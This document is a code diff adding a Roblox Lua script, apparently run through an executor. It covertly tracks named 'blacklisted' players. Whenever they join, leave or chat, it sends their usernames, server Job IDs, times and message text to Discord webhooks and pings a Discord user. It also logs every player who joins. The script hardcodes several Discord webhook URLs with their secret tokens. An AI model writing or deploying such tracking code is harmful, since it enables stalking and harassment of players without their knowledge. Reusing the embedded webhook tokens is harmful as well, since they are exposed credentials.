+        leaveWebhook = "https://discord.com/api/webhooks/1390951639158095975/QSXG91Y-KjhbHCdFnA_dVhLkx418FbGS1RVKm3OFGEgHqQkKpehgquRjn5SyXRPnTk5g",
+        messageWebhook = "https://discord.com/api/webhooks/1390951679637196872/0nwuqHrOkFxNZOtDB3zWQjlsvTRNJ1-LJhLLvkJLnw8xq8bR3YMokt04C961EjQTsuTk",
+        color = { join = 0x00FF00, leave = 0xFF0000, message = 0xFFFFFF },
+		titlePrefix = "Double Down"
+    }
+}
+
+local function isRobuxOnlyServer()
+	return game.PlaceId ~= 9476339275
+end
+
+local function sendWebhook(url, payload)
+	local json = HttpService:JSONEncode(payload)
+	request({
+		Url = url,
+		Method = "POST",
+		Headers = { ["Content-Type"] = "application/json" },
+		Body = json
+	})
+end
+
+local function createPayload(titleUser, webhookData, action, extra, mentionUserId)
+	local timeString = os.date("%I:%M %p"):upper()
+	local baseTitle = string.upper(titleUser) .. " " .. action:upper() .. " DETECTED"
+	local desc = action == "join" and "Our content monitors have detected a blacklisted player joining the server."
+		or action == "leave" and "Blacklisted player has left the server."
+		or "Blacklisted player sent a message."
+
+	local payload = {
+		username = webhookData.titlePrefix,
+		embeds = { {
+			title = baseTitle,
+			description = desc,
+			color = webhookData.color[action] or 0xFFFF00,
+			fields = {
+				{name = "Monitor Username", value = "MONITOR_" .. string.upper(Players.LocalPlayer.Name), inline = true},
+				{name = "Robux Only Server", value = tostring(isRobuxOnlyServer()), inline = false},
+				{name = "Job ID", value = game.JobId, inline = false},
+				{name = "Time", value = timeString, inline = false}
+			}
+		} }
+	}
+
+	if action == "message" and extra then
+		table.insert(payload.embeds[1].fields, 2, {name = "Message", value = extra, inline = false})
+	end
+
+	if mentionUserId then
+		payload.content = "<@" .. mentionUserId .. ">"
+		payload.allowed_mentions = { users = { mentionUserId } }
+	end
+
+	return payload
+end
+
+Players.PlayerAdded:Connect(function(plr)
+	local name = plr.Name
+	if blacklist[name] then
+		local webhookData = blacklist[name]
+		local mentionId = (name == "BlueThikFish") and "1281444060418015304" or nil
+		local payload = createPayload(plr.DisplayName, webhookData, "join", nil, mentionId)
+		sendWebhook(webhookData.joinWebhook, payload)
+	end
+end)
+
+local globalJoinWebhook = "https://discord.com/api/webhooks/1388933063173738526/i5B2c8nbjhmjgN80ESzoVXTp-XuO619SNtprGkPdKO9RO0NQLGyg7I2fRkYVX31A6mwN"
+
+Players.PlayerAdded:Connect(function(plr)
+	local name = plr.Name
+	if blacklist[name] and name ~= "BlueThikFish" and name ~= "Mini_Zlob5000" then return end
+	local timeString = os.date("%I:%M %p"):upper()
+	local payload = {
+		username = "Double Down - Global Join Log",
+		embeds = { {
+			title = plr.DisplayName .. " JOINED",
+			description = "A player has joined the server.",
+			color = 0x3399FF,
+			fields = {
+				{name = "Username", value = plr.Name, inline = true},
+				{name = "Display Name", value = plr.DisplayName, inline = true},
+				{name = "Monitor Username", value = "MONITOR_" .. string.upper(Players.LocalPlayer.Name), inline = true},
+				{name = "Robux Only Server", value = tostring(isRobuxOnlyServer()), inline = false},
+				{name = "Job ID", value = game.JobId, inline = false},
+				{name = "Time", value = timeString, inline = false}
+			}
+		} }
+	}
+	sendWebhook(globalJoinWebhook, payload)
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+	local name = plr.Name
+	if blacklist[name] and blacklist[name].leaveWebhook then
+		local webhookData = blacklist[name]
+		local mentionId = (name == "BlueThikFish") and "1281444060418015304" or nil
+		local payload = createPayload(plr.DisplayName, webhookData, "leave", nil, mentionId)
+		sendWebhook(webhookData.leaveWebhook, payload)
+	end
+end)
+
+if generalChannel then
+	generalChannel.MessageReceived:Connect(function(message)
+		local sender = message.TextSource and message.TextSource.Name
+		if sender and blacklist[sender] then
+			local webhookData = blacklist[sender]
+			if webhookData.messageWebhook then
+				local mentionId = (sender == "BlueThikFish") and "1281444060418015304" or nil
+				local payload = createPayload(sender, webhookData, "message", message.Text, mentionId)
+				sendWebhook(webhookData.messageWebhook, payload)
+			end
+		end
+	end)
+end
